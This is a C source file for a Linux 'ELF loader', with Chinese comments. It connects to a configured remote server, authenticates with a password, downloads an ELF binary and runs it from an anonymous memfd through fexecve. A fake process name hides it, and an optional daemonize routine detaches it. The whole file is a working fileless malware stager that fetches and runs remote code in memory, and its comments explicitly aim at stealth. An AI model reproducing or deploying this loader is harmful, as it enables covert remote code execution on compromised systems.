/**
 * Copyright (c) 2020-2021 aplyc1a <aplyc1a@protonmail.com>
 * 
 * How to start:
 * step 1: gcc elfloader.c -o loader
 * step 2: ./loader
 * 
 **/
 
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <time.h>
#include <linux/memfd.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/param.h>
#include <arpa/inet.h>
///////////////////////////////////////////////
//          CONFIGURATION   HERE             //
///////////////////////////////////////////////
uint8_t *ip="192.168.44.128";
uint16_t port=40050;
//设置访问server的口令，只有口令通过才能下载elf
uint8_t auth[20]= {"123456"};
//设置内存ELF的命令行参数，这会破坏隐身性!!!!
char *fake_argv[] = {"[ipv4_addr]", NULL, NULL};
///////////////////////////////////////////////
//          CONFIGURATION   DONE             //
///////////////////////////////////////////////

void init_daemon(void) {
    int pid;
    int i;
    if(pid=fork()) {
        exit(0);
    } else if(pid< 0) {
        exit(1);
    }
    setsid();
    if(pid=fork()) {
        exit(0);
    } else if(pid< 0) {
        exit(1);
    }
    for (i=0;i< NOFILE;++i) {
        close(i);
    }
    chdir("/tmp");
    umask(0);
    return;
}

void download_elf(uint8_t **elf, long int *length) {
    uint8_t stage1_data[20] = {0};
	
    // step 1: 主动连接socket server
    uint8_t sock;
    struct sockaddr_in server_listen_addr;
    bzero(&server_listen_addr,sizeof(server_listen_addr));
    server_listen_addr.sin_family=AF_INET;
    server_listen_addr.sin_port=htons(port);
    inet_pton(AF_INET,ip,(void*)&server_listen_addr.sin_addr);
    sock=socket(AF_INET,SOCK_STREAM,0);
    uint8_t ret=connect(sock,(const struct sockaddr *)&server_listen_addr,
                        sizeof(struct sockaddr));
    if(ret<0) {
		fprintf(stderr,"socket connect failed!\n");
        exit(2);
    }
    // step 2: 发送auth关键字
    uint8_t num = send(sock,(void*)auth,strlen(auth),0);
    
    // step 3: 接收ELF大小信息
    ret = recv(sock, stage1_data, sizeof(stage1_data), 0);
    
    printf("[debug] stage1: ");for(uint8_t i=0; i<ret; i++) printf("%02x ",stage1_data[i]);printf("\n");

    if(stage1_data[0]=='E' && stage1_data[1]=='F' ){
		fprintf(stderr,"auth failed!\n");
        exit(3);
    }
    
    int64_t stage2_size = atoi(stage1_data + 2);
    *length = stage2_size;
    printf("[debug] stage2: data_size %ldb\n",stage2_size);
    
    // step 4: 接收ELF数据。elf也即stage2_data
    *elf = (uint8_t*)malloc(stage2_size * sizeof(uint8_t));
    int64_t j = 0;
    uint8_t buff_size = 50;
    do {
        if (stage2_size > buff_size) {
            ret = recv(sock, *elf + j, buff_size, 0);
            //for(uint8_t k=0; k<buff_size; k++){printf("%02x ",*(*elf + j + k));}; printf("\n");
            j += buff_size;
        } else {
            ret = recv(sock, *elf + j, stage2_size, 0);
            //for(uint8_t k=0; k<stage2_size; k++){printf("%02x ",*(*elf + j + k));}; printf("\n");
            j += stage2_size;
            break;
        }
        stage2_size -= ret;
        usleep(100);
    } while (stage2_size > 0);
    
    // step 5: 接收完毕，关闭连接。
    close(sock);
}

void load_elf(char *buff, long int length,char *envp[]) {
	//创建内存匿名文件
    int fd = syscall(__NR_memfd_create, "elf", MFD_CLOEXEC);
	
	//设置匿名文件的大小及内容
    ftruncate(fd, length);
    write(fd, buff, length);
    free(buff);
	
	//通过句柄，运行文件
	printf("Running.....\n");
    fexecve(fd, fake_argv, envp);
}

int main(int agrc,char *argv[],char *envp[]) {
    uint8_t *buff = NULL;
    long int len = 0;
    //init_daemon();
    download_elf(&buff, &len);
    load_elf(buff, len, envp);
    return 0;
}